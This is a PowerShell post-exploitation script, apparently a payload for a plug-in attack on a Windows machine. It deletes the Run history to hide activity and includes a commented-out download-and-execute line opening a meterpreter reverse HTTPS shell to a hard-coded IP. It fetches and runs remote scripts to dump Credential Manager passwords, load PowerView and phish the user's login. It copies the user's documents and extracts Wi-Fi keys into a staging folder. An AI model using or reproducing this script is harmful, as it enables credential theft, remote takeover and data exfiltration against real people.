# REMOVING RUN HISTORY
Remove-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Force

# CREATING REVERSE SHELL TO KALI LINUX ON HTTPS
#iex ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/Invoke-Shellcode-Met/master/Invoke-Shellcode.ps1')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 38.129.96.54 -Lport 8443 -Force; pause

# CREATING FOLDER IN MY DOCUMENTS
New-Item -Path "$env:USERPROFILE\Documents" -Name "_YOU_GOT_HACKED" -ItemType Directory -Force
$ExfilPath="$env:USERPROFILE\Documents\_YOU_GOT_HACKED"
New-Item -Path "$ExfilPath" -Name "UserDocuments" -ItemType Directory -Force
$UserDocsExfil="$ExfilPath\UserDocuments"

# DUMPING CREDENTIAL STORE PASSWORDS
iex ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/CredentialStore/master/Get-CredStoreCredentials.ps1')) | Export-Csv -Path $ExfilPath\CredStore.csv -NoTypeInformation

# ADDING POWERVIEW MODULES
iex ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/PowerSploit/master/Recon/PowerView.ps1'))

# COPY DOCUMENTS FROM THE COMPUTER
Get-ChildItem $env:USERPROFILE\Documents | where {$_.PSIsContainer -ne "$true"}| Copy-Item -Destination $UserDocsExfil

# GETTING WI-FI PASSWORDS
$AllSSIDs=@()
$PatternMatch='.*User profile.*:.*'
$Profiles=netsh.exe wlan show profile | Select-String -Pattern $PatternMatch
Foreach ($WiFiProfile in $Profiles){
    $ProfileName=($WiFiProfile.Matches.GetValue(0).value.split(':')[1]).trim()
    $KeyPattern='.*Key Content.*'
    $ProfileKey=netsh.exe wlan show profile name="$ProfileName" key=clear | Select-String $KeyPattern
    If ($ProfileKey -ne $null){
        $PasswordClear=($ProfileKey.Matches.GetValue(0).value.split(':')[1]).trim()
        $AllSSIDs += ""|Select @{n="SSID";e={$ProfileName}},@{n="Password";e={$PasswordClear}}
        }
    }
$AllSSIDs | Export-Csv $ExfilPath\Wi-Fi_Passwords.csv -NoTypeInformation

# CREDENTIAL PHISH
iex ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/nishang/master/Gather/Invoke-CredentialsPhish.ps1'))
Invoke-CredentialsPhish | Out-File $ExfilPath\CredPhish.txt
